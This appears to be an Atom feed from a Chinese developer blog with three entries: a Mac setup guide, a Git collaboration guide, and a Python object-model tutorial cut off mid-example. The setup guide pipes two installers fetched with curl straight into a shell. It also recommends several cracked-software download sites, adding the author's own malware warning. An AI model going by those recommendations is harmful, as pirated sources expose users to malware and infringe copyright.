&gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># poetry</span></span><br><span class="line">curl -sSL https://install.python-poetry.org | python3 -</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rust</span></span><br><span class="line">curl --proto <span class="string">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Go</span></span><br><span class="line">brew install go</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装OpenJDK</span></span><br><span class="line">brew install openjdk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置JAVA_HOME环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export JAVA_HOME=$(/usr/libexec/java_home)&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证安装</span></span><br><span class="line">java -version</span><br><span class="line">javac -version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装OpenJDK</span></span><br><span class="line">brew install openjdk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置JAVA_HOME环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export JAVA_HOME=$(/usr/libexec/java_home)&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br><span class="line"></span><br><span class="line">brew install maven</span><br><span class="line">brew install gradle</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="通讯和办公软件">通讯和办公软件</h2><p>以下是一些常用的通讯和办公软件及其简介：</p><ul><li><strong>QQ:</strong> 腾讯开发的即时通讯软件，广泛用于中国大陆地区</li><li><strong>微信:</strong> 另一款腾讯开发的流行即时通讯应用，支持语音、视频通话和支付功能</li><li><strong>腾讯会议:</strong> 腾讯开发的视频会议软件，提供高清视频会议、屏幕共享和协作功能，适用于企业和个人用户</li><li><strong>Zoom:</strong> 流行的视频会议和在线协作平台，提供高质量视频通话、虚拟背景和会议录制等功能，广泛用于远程工作和在线教育</li><li><strong>Telegram:</strong> 注重隐私和安全的即时通讯应用，支持端到端加密</li><li><strong>ChatGPT:</strong> OpenAI 开发的 AI 聊天机器人官方客户端，用于智能对话和信息查询</li><li><strong>Microsoft Word:</strong> 微软开发的文字处理软件，用于创建和编辑文档</li><li><strong>Microsoft Excel:</strong> 电子表格软件，用于数据分析、计算和图表制作</li><li><strong>Microsoft PowerPoint:</strong> 演示文稿制作软件，用于创建幻灯片和演示</li><li><strong>Microsoft Outlook:</strong> 电子邮件客户端和个人信息管理器</li><li><strong>OneDrive:</strong> 微软的云存储服务，用于文件同步和共享</li><li><strong>有道词典:</strong> 网易开发的英汉互译词典软件，支持多种语言翻译和学习功能</li><li><strong>滴答清单:</strong> 一款跨平台的任务管理和待办事项应用，帮助用户提高工作效率</li><li><strong>Maccy:</strong> 一款轻量级的剪贴板管理工具，可以保存剪贴板历史记录，并提供快速访问和搜索功能。它支持文本、图片和文件，能大大提高工作效率。</li><li><strong>Notion:</strong> 一款功能强大的协作笔记和项目管理工具，提供灵活的页面结构、数据库功能和丰富的模板，适用于个人和团队使用。</li><li><strong>Typora:</strong> 一款简洁优雅的 Markdown 编辑器，提供实时预览功能，支持多种主题和导出格式，非常适合写作和文档编辑。</li><li><strong>IINA:</strong> 一款现代化的开源视频播放器，专为 macOS 设计。它支持多种视频格式，界面美观，功能强大，包括硬件解码、自定义快捷键、在线字幕下载等特性。</li><li><strong>Adobe Acrobat Reader:</strong> 这是一款免费的 PDF 查看器和阅读器。它允许用户打开、查看、注释和打印 PDF 文件。它是处理 PDF 文档的标准工具，特别适合那些需要阅读或处理大量 PDF 文件的用户。</li><li><strong>Google Chrome:</strong> 这是一款由 Google 开发的快速、安全且易用的网络浏览器。</li><li><strong>Bartender 5:</strong> 这是一款强大的菜单栏管理工具，可以帮助用户整理和隐藏 Mac 菜单栏上的图标。它提供了自定义排序、隐藏不常用图标、创建快捷键等功能，使菜单栏更加整洁和高效。</li><li><strong>CleanShot X:</strong> 一款功能强大的屏幕捕捉和录制工具，专为 macOS 设计。它提供了丰富的编辑功能、云存储集成、滚动截图等高级特性，是截图和屏幕录制的理想选择。</li><li><strong>SF Symbols:</strong> 一款由 Apple 开发的符号和图标库，为 iOS、macOS、tvOS 和 watchOS 应用程序设计提供了一致的、可扩展的符号集。可以用来绘图。</li><li><strong>mos:</strong> 一款用于平滑鼠标滚动的工具，可以让非 Apple 鼠标在 macOS 上获得更流畅的滚动体验。它允许用户自定义滚动速度、方向和加速度，提高使用舒适度。</li><li><strong>Mounty:</strong> 一款免费的工具，允许 macOS 读写 NTFS 格式的外部驱动器。它能够临时挂载 NTFS 分区为读写模式，使用户能够在 Mac 上轻松地对 NTFS 格式的硬盘进行读写操作，无需重新格式化或使用付费软件。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># QQ</span></span><br><span class="line">brew install --cask qq</span><br><span class="line"></span><br><span class="line"><span class="comment"># 微信</span></span><br><span class="line">brew install --cask wechat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 腾讯会议</span></span><br><span class="line">brew install --cask tencent-meeting</span><br><span class="line"></span><br><span class="line"><span class="comment"># Zoom</span></span><br><span class="line">brew install --cask zoom</span><br><span class="line"></span><br><span class="line"><span class="comment"># Telegram</span></span><br><span class="line">brew install --cask telegram</span><br><span class="line"></span><br><span class="line"><span class="comment"># ChatGPT (官方客户端）</span></span><br><span class="line">brew install --cask chatgpt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Microsoft Word</span></span><br><span class="line">brew install --cask microsoft-word</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Microsoft Excel</span></span><br><span class="line">brew install --cask microsoft-excel</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Microsoft PowerPoint</span></span><br><span class="line">brew install --cask microsoft-powerpoint</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Microsoft Outlook</span></span><br><span class="line">brew install --cask microsoft-outlook</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 OneDrive（云存储服务）</span></span><br><span class="line">brew install --cask onedrive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装有道词典</span></span><br><span class="line">brew install --cask youdaodict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装滴答清单</span></span><br><span class="line">brew install --cask ticktick</span><br><span class="line"></span><br><span class="line"><span class="comment"># 剪贴板管理</span></span><br><span class="line">brew install maccy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Notion</span></span><br><span class="line">brew install --cask notion</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Typora</span></span><br><span class="line">brew install --cask typora</span><br><span class="line"></span><br><span class="line"><span class="comment"># 播放器</span></span><br><span class="line">brew install --cask iina</span><br><span class="line"></span><br><span class="line"><span class="comment"># PDF</span></span><br><span class="line">brew install --cask adobe-acrobat-reader</span><br><span class="line"></span><br><span class="line"><span class="comment"># 浏览器</span></span><br><span class="line">brew install --cask google-chrome</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图标库</span></span><br><span class="line">brew install --cask sf-symbols</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鼠标管理</span></span><br><span class="line">brew install mos</span><br></pre></td></tr></table></figure><h1>软件下载站</h1><p>建议首先从 homebrew 下载，然后从 appstore 下载，没有再去看官网，最后再去看破解软件。</p><ul><li><a href="https://openalternative.co/">https://openalternative.co/</a> 是一个很有用的网站，可以帮助你找到常用软件的开源替代品。</li><li><a href="https://macked.app/">https://macked.app/</a> 是另一个提供破解版 Mac 软件的网站。它提供了大量的应用程序，包括生产力工具、设计软件、开发工具等。</li><li><a href="https://macwk.cn/">https://macwk.cn/</a> 是一个提供精品 Mac 软件下载的网站，包括许多破解版软件。它每天更新大量 Mac 应用，涵盖了各种类型的软件。</li><li><a href="https://foxirj.com/">https://foxirj.com/</a> 是另一个提供 Mac 破解软件下载的网站。它提供了广泛的软件类别，包括设计工具、开发软件和生产力应用等。</li><li><a href="https://xmac.app/">https://xmac.app/</a> 是一个提供 Mac 破解软件下载的网站。它提供了大量的应用程序，包括生产力工具、设计软件、开发工具等。资源更新较快，大部分来自 TNT team。</li></ul><p>这些软件可能带来安全隐患，因为用户必须信任开发者的签名。如果发布者有恶意，可能会导致严重的问题，如数据泄露或系统损坏。<br>为了减少风险，我采取了一些预防措施。首先，我购买并安装了卡巴斯基等可靠的安全软件，这在一定程度上可以检测和防御潜在的恶意软件。其次，我会仔细研究软件的来源和用户反馈，尽量从信誉较好的网站下载。此外，我会定期备份重要数据，以防万一出现问题。<br>对于学生和初创企业，许多软件公司提供优惠或免费版本，这些都是值得考虑的替代方案。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1&gt;为什么我喜欢 MacBook&lt;/h1&gt;
&lt;p&gt;我喜欢 MacBook 有以下几个原因：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;优秀的硬件质量：&lt;/strong&gt; MacBook 以其出色的工艺和耐用性著称，铝制一体化机身既美观又坚固。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;休眠与唤醒的无缝体验：&lt;/strong&gt; MacBook 合上盖子即可快速休眠，打开盖子能立即恢复工作状态，不会出现无法休眠或休眠后无法唤醒的问题，提供流畅、稳定的使用体验。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;长续航时间：&lt;/strong&gt; MacBook 的电池续航能力一直是业界领先，特别是 M 系列芯片的推出更是大幅提升了续航表现。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;出色的显示屏：&lt;/strong&gt; Retina 显示屏提供高分辨率和准确的色彩还原，非常适合设计和视频编辑工作。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;适合开发的 Unix 基础：&lt;/strong&gt; macOS 基于 Unix，为开发者提供了强大的命令行工具和兼容性</summary>
        
      
    
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/categories/developer/"/>
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/tags/developer/"/>
    
  </entry>
  
  <entry>
    <title>Git合作指南</title>
    <link href="https://www.blog-blockchain.xyz/dev/git/"/>
    <id>https://www.blog-blockchain.xyz/dev/git/</id>
    <published>2024-10-29T16:21:20.000Z</published>
    <updated>2024-11-18T09:44:45.701Z</updated>
    
    <content type="html"><![CDATA[<h1><strong>Fork 项目仓库</strong></h1><ul><li>进入项目的 GitHub 页面，点击右上角的 <strong>Fork</strong> 按钮，将该项目仓库复制到自己的 GitHub 账户下。</li><li>这个 Fork 的副本是你对项目的个人副本，你可以在上面进行改动而不会影响原项目。</li></ul><h1><strong>Clone 项目到本地</strong></h1><ul><li><p>在你的 GitHub 账户中找到刚刚 Fork 的仓库，复制仓库的链接。</p></li><li><p>在本地执行以下命令将仓库克隆到你的电脑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone &lt;your-forked-repo-url&gt;</span><br></pre></td></tr></table></figure></li></ul><h1><strong>添加上游仓库 (Upstream)</strong></h1><ul><li><p>为了保持你的 Fork 和原项目的同步，需要添加原项目的仓库地址作为 “上游仓库”。</p></li><li><p>进入克隆的项目文件夹，运行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add upstream &lt;original-repo-url&gt;</span><br></pre></td></tr></table></figure></li></ul><h1><strong>同步上游仓库的更新</strong></h1><ul><li><p>在进行更改之前，确保你的分支是最新的。可以通过以下命令拉取上游仓库的更新并合并到本地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout main</span><br><span class="line">git merge upstream/main</span><br></pre></td></tr></table></figure></li><li><p>这样可以确保你的本地仓库包含最新的代码，避免冲突。</p></li></ul><h1><strong>创建新分支</strong></h1><ul><li><p>不要在 <code>main</code> 分支上直接进行改动，建议为每个功能或修复创建一个新的分支。</p></li><li><p>创建并切换到新分支：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b feature-branch-name</span><br></pre></td></tr></table></figure></li><li><p>给分支起一个描述性的名字，比如 <code>fix-typo</code> 或 <code>add-new-feature</code>。</p></li></ul><h1><strong>进行改动并提交</strong></h1><ul><li><p>按照项目的规范进行代码更改、添加功能或修复 bug。</p></li><li><p>完成后，将改动添加并提交：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;描述性的提交信息，如修复了某个问题或添加了某个功能&quot;</span><br></pre></td></tr></table></figure></li></ul><p>一般来说，<strong>每个提交应当专注于一个小而清晰的更改</strong>。以下情况通常是提交的好时机：</p><ul><li><p><strong>完成一个小的功能或逻辑</strong>：例如实现一个函数、方法或模块。</p></li><li><p><strong>修复一个 Bug</strong>：当你修复了一个特定的问题时，可以单独提交，以便追踪问题。</p></li><li><p><strong>文档更新</strong>：当你更新了 README、注释或其他文档文件时。</p></li><li><p><strong>代码重构</strong>：对代码结构进行了调整，但没有改变功能时。</p></li><li><p><strong>测试用例更新</strong>：添加或修改了测试用例。</p></li></ul><p>避免以下情况频繁提交：</p><ul><li><strong>过于细碎的改动</strong>：比如一行代码的微调，除非是重要的修复。</li><li><strong>未经测试的代码</strong>：提交前应当确保改动是稳定的，或者明确标注为“临时提交”。</li></ul><p>常见的动词包括：</p><p><strong>修复 (Fix)</strong>：修复 Bug 或问题，例如 <code>Fix login error in login page</code></p><p><strong>添加 (Add)</strong>：添加新功能或模块，例如 <code>Add user authentication module</code></p><p><strong>修改 (Update)</strong>：改进已有功能或文档，例如 <code>Update README with setup instructions</code></p><p><strong>重构 (Refactor)</strong>：代码结构调整，例如 <code>Refactor authentication module for clarity</code></p><p><strong>删除 (Remove)</strong>：删除不需要的代码或文件，例如 <code>Remove deprecated API call</code></p><p>如果项目涉及到的文件比较多，那么可以加入前缀，比如在哪个包内做的修改。</p><h1><strong>将更改推送到 Fork 的仓库</strong></h1><ul><li><p>将改动推送到你自己 Fork 仓库的对应分支：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin feature-branch-name</span><br></pre></td></tr></table></figure></li></ul><h1><strong>创建 Pull Request (PR)</strong></h1><ul><li>回到你的 GitHub 仓库页面，会看到一个 <strong>Compare &amp; Pull Request</strong> 的按钮，点击它。</li><li>在 Pull Request 页面中，填写你的改动描述，包括做了哪些更改、为什么进行这些更改等。</li><li>提交 Pull Request，等待项目维护者的审核。</li></ul><h1><strong>与项目维护者沟通</strong></h1><ul><li>项目维护者可能会对你的 Pull Request 提出建议或要求你修改。根据反馈进行调整，并再次提交到你的分支。</li><li>更新 PR 时不需要重新创建 PR，直接推送到同一个分支即可。</li></ul><h1>Git 常用命令</h1><h2 id="怎么提交">怎么提交</h2><p>git commit -m：仅提交已在暂存区的文件，不影响未暂存的文件。<br>git commit -am：将所有已跟踪文件的改动添加到暂存区并提交，但不包含新文件。</p><h2 id="合并-Commit">合并 Commit</h2><p><strong>场景一：将指定提交后的所有提交合并到该提交。</strong></p><ol><li><p>找到目标提交的哈希值：首先，使用以下命令查看提交历史，找到要保留的提交（即你希望将后续更改合并到的提交）。<code>git log --oneline</code></p></li><li><p>重置到指定提交：使用 git reset 将分支回退到指定提交。这样会取消指定提交后的所有提交，但保留文件改动在工作区中。<code>git reset --soft &lt;commit-hash&gt;</code><br>其中 <commit-hash> 是目标提交的哈希值，例如 abc1234。<br>–soft 参数确保保留所有更改在暂存区，以便进行下一步的合并提交。hard 就会删除，请不要使用！</p></li><li><p>重新提交所有更改：现在，所有更改都在暂存区中，你可以将它们合并为一个新的提交。<code>git commit -m &quot;将所有更改合并为一次提交&quot;</code></p></li></ol><p><strong>场景二：将未提交的更改合并到上一次提交。</strong><br>如果在最近的提交之后还有未提交的更改，并希望将它们合并到该提交中，可以使用 git commit --amend。</p><ol><li>暂存未提交的更改：首先，将所有未提交的更改添加到暂存区。<code>git add .</code></li><li>使用 --amend 更新上一个提交：将这些暂存的更改添加到上一个提交中。<code>git commit --amend -m &quot;更新上一个提交的信息&quot;</code></li><li>这将打开编辑器，允许你修改上一次提交的信息。如果你希望保留原始信息，只需保存并关闭编辑器即可。</li></ol><h2 id="要复原某个文件或者上次提交">要复原某个文件或者上次提交</h2><p>场景一：将文件从暂存区移除，但保留在工作区中，改动还存在，但是 git 不记录。<code>git reset &lt;filename&gt;</code><br>场景二：直接复原文件到上次提交。<code>git checkout -- &lt;filename&gt;</code><br>场景三：直接复原整个项目到上次提交。<code>git reset --hard HEAD</code></p><blockquote><p>合并修改，建议在 IDE 里进行，很方便。更多的遇到的时候再学习吧。</p></blockquote>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1&gt;&lt;strong&gt;Fork 项目仓库&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;进入项目的 GitHub 页面，点击右上角的 &lt;strong&gt;Fork&lt;/strong&gt; 按钮，将该项目仓库复制到自己的 GitHub 账户下。&lt;/li&gt;
&lt;li&gt;这个 Fork 的副本是你对项目的个人副本，你可以在上面进行改动而不会影响原项目。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;strong&gt;Clone 项目到本地&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;在你的 GitHub 账户中找到刚刚 Fork 的仓库，复制仓库的链接</summary>
        
      
    
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/categories/developer/"/>
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/tags/developer/"/>
    
  </entry>
  
  <entry>
    <title>(三）Python面向对象设计模式</title>
    <link href="https://www.blog-blockchain.xyz/dev/python-design/"/>
    <id>https://www.blog-blockchain.xyz/dev/python-design/</id>
    <published>2024-10-28T18:53:20.000Z</published>
    <updated>2024-11-18T09:44:53.242Z</updated>
    
    <content type="html"><![CDATA[<h1>类和对象</h1><h2 id="一切都是对象">一切都是对象</h2><p>在 Python 中，“一切皆对象”是一个核心理念。简单来说，<strong>Python 中的所有东西都是对象</strong>，无论是数值、字符串、函数、类，甚至是模块和代码本身。Python 对象有三个特征：<strong>身份</strong>、<strong>类型</strong>和<strong>值</strong>。</p><ul><li><strong>身份</strong>：对象在内存中的地址，可以通过 <code>id()</code> 函数查看，例如 <code>id(obj)</code>。</li><li><strong>类型</strong>：对象的类别，可以通过 <code>type()</code> 函数查看。例如，<code>type(5)</code> 返回 <code>&lt;class 'int'&gt;</code>。</li><li><strong>值</strong>：对象的实际内容或数据，直接调用变量名即可查看。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(i))      <span class="comment"># 输出 i 的存储地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(i))    <span class="comment"># 输出 &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(i)          <span class="comment"># 输出变量 i 的值</span></span><br></pre></td></tr></table></figure><p>一切皆对象意味着我们可以将几乎任何东西赋值给变量或作为参数传递给函数。把任何函数传给一个变量。</p><p>类（Class）与对象（Object）是不同的，类是没初始化的模板，定义了结构和行为；对象是初始化了的实例，内存中有具体的值。</p><ul><li><strong>类</strong>：类是对象的蓝图或模板，用来描述一类事物的通用结构和行为。定义类时，指定了该类对象的属性和方法。</li><li><strong>对象</strong>：对象是类的具体实例，表示某个具体的事物。</li></ul><p>但是从更加一般的角度来说，类也是一种对象，也是有具体的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class MyClass:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">print(id(MyClass))</span><br><span class="line">print(type(MyClass))  # 输出: &lt;class &#x27;type&#x27;&gt;</span><br><span class="line">print(MyClass) # &lt;class &#x27;__main__.MyClass&#x27;&gt;</span><br></pre></td></tr></table></figure><h2 id="重要的基类">重要的基类</h2><p>在 Python 中，<code>type</code> 和 <code>object</code> 是两个核心的基类：</p><ul><li><code>object</code> 是所有类的基类，所有类都继承自 <code>object</code>。</li><li><code>type</code> 是所有类的类型，也就是说，<strong>每个类都是 <code>type</code> 的实例</strong>，包括了 type 本身和 object。</li></ul><p>总的来说，<strong><code>type</code> 是所有类的类型</strong>：每个类都是 <code>type</code> 的实例，包括 <code>MyClass</code>、<code>int</code> 等。</p><p><strong><code>type</code> 也是创建类的工厂</strong>：<code>type</code> 是一种创建类对象的机制，相当于类的构造器。</p><p><strong><code>type</code> 是一个类，且继承自 <code>object</code></strong>：它可以创建类，并且它自己也是一个类，具有类的一切特性。</p><img src="https://cdn.blog-blockchain.xyz/2024/10/8e73fcaf5b18b2aa6b9e420838412076.png" alt="img" style="zoom:50%;" /><h2 id="类的常见属性">类的常见属性</h2><p><code>.__base__</code> 属性表示<strong>当前类的直接基类</strong>，即当前类继承的父类。如果一个类没有显式继承父类，则 <code>.__base__</code> 为 <code>object</code>，因为所有类默认继承自 <code>object</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span>(<span class="title class_ inherited__">Parent</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Child.__base__)  <span class="comment"># 输出: &lt;class &#x27;__main__.Parent&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(Parent.__base__) <span class="comment"># 输出: &lt;class &#x27;object&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>在这里，<code>Child.__base__</code> 是 <code>Parent</code>，而 <code>Parent.__base__</code> 是 <code>object</code>，因为 <code>object</code> 是所有类的最终基类。</p><p><code>.__class__</code>表示<strong>当前实例或类的类型</strong>，即这个对象是由哪个类创建的。对于类本身，<code>.__class__</code> 通常会指向 <code>type</code>，因为类对象是 <code>type</code> 的实例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">obj = MyClass()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(obj.__class__)   <span class="comment"># 输出: &lt;class &#x27;__main__.MyClass&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(MyClass.__class__)  <span class="comment"># 输出: &lt;class &#x27;type&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>在这个示例中，<code>obj.__class__</code> 表明 <code>obj</code> 是 <code>MyClass</code> 的实例，而 <code>MyClass.__class__</code> 表明 <code>MyClass</code> 是 <code>type</code> 的实例。</p><p><code>.__dict__</code> 属性是一个<strong>字典</strong>，包含类或实例的所有属性。对于实例，<code>.__dict__</code> 包含该实例的所有实例属性。对于类，<code>.__dict__</code> 包含该类的所有类属性和方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    class_attr = <span class="string">&quot;class attribute&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.instance_attr = value</span><br><span class="line"></span><br><span class="line">obj = MyClass(<span class="string">&quot;instance attribute&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(obj.__dict__)         <span class="comment"># 输出: &#123;&#x27;instance_attr&#x27;: &#x27;instance attribute&#x27;&#125;</span></span><br><span class="line"><span class="built_in">print</span>(MyClass.__dict__)     <span class="comment"># 输出: 包含 class_attr, __init__ 等</span></span><br></pre></td></tr></table></figure><p>在这个示例中，<code>obj.__dict__</code> 仅包含实例属性，而 <code>MyClass.__dict__</code> 包含类属性和方法。</p><p><code>.__subclasses__()</code> 方法返回<strong>所有直接子类的列表</strong>。这在需要递归遍历继承树或找到所有子类时非常有用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child1</span>(<span class="title class_ inherited__">Base</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child2</span>(<span class="title class_ inherited__">Base</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Base.__subclasses__())  <span class="comment"># 输出: [&lt;class &#x27;__main__.Child1&#x27;&gt;, &lt;class &#x27;__main__.Child2&#x27;&gt;]</span></span><br></pre></td></tr></table></figure><p>这里，<code>Base.__subclasses__()</code> 返回一个包含 <code>Child1</code> 和 <code>Child2</code> 的列表。</p><p><code>.__name__</code> 是类的简单名称，返回类的名称字符串。<code>.__qualname__</code> 是类的完全限定名（Qualified Name），包含嵌套类或作用域信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span>:</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Inner</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Outer.__name__)         <span class="comment"># 输出: Outer</span></span><br><span class="line"><span class="built_in">print</span>(Outer.Inner.__name__)    <span class="comment"># 输出: Inner</span></span><br><span class="line"><span class="built_in">print</span>(Outer.Inner.__qualname__)  <span class="comment"># 输出: Outer.Inner</span></span><br></pre></td></tr></table></figure><p><code>Inner.__qualname__</code> 以字符串形式描述了完整的嵌套路径信息。</p><p><code>__call__</code> 方法：类的可调用行为，使得类的实例可以像函数一样被调用。如果你在类中定义了 <code>__call__</code> 方法，那么创建的实例可以被直接调用，并执行 <code>__call__</code> 方法中的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CallableClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Instance is called like a function&quot;</span>)</span><br><span class="line"></span><br><span class="line">obj = CallableClass()</span><br><span class="line">obj()  <span class="comment"># 输出: Instance is called like a 